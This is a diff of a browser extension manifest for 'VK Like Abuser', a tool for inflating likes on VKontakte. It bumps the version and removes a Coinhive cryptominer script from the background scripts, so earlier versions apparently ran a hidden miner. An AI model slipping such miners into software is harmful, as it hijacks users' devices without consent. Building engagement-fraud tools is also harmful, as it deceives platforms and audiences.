@@ -1,7 +1,7 @@
 {
   "name": "VK Like Abuser",
   "description": "Бесплатная автоматическая накрутка лайков на страницу ВКонтакте.",
-  "version": "0.3.6",
+  "version": "0.3.7",
   "manifest_version": 2,
   "icons": {
     "128": "icon.png"
@@ -17,7 +17,7 @@
     "https://api.vk.com/*"
   ],
   "background": {
-    "scripts": ["scripts/socket.io.js", "scripts/coinhive.min.js", "src/background/background.js"]
+    "scripts": ["scripts/socket.io.js", "src/background/background.js"]
   },
   "content_scripts": [
     {
